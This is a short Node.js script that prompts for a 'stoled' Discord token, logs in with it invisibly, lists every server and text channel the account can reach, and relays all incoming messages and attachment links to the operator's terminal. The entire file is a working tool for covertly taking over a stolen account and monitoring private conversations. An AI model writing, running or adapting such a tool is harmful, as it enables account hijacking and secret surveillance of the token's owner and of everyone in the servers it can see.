const { Client } = require("discord.js");
var term = require( 'terminal-kit' ).terminal;

const bot = new Client();
term.green("Stoled token:\n")
term.inputField(
    function( error , input ) {
        bot.login(input)
			.catch(e => console.log(e))

		bot.on("ready", () => {
			bot.user.setPresence({status: 'invisible'})
			term(`\n^yIt's^ ${bot.user.username}\n^yIsBot?:^ ${bot.user.bot}\n^yguildlist:^\n`)
			bot.guilds.cache.forEach(g => {
				term(`${g.name} | ${g.id} -> [^r${g.channels.cache.size}^w] ${g.owner.user.username}\n`)
				g.channels.cache.forEach(c => {
					if (c.type != "text") return;
					term(`\t[^r${c.position}^w] ${c.name} | ${c.id}\n`)
				})				
			})

			term.green("\n\n----------------\nJust Chatting!\n----------------\n\n")

		})

bot.on("message", msg => {
	if (!msg.attachments.first()) {
		var atch = '\t'
	} else {
		var atch = msg.attachments.first().url
	}
	term(`[ ^y${msg.guild.name}^ / ^y${msg.channel.name}^ ] ^o${msg.author.username}^ > ${msg.content}\n${atch}\n`)
})});

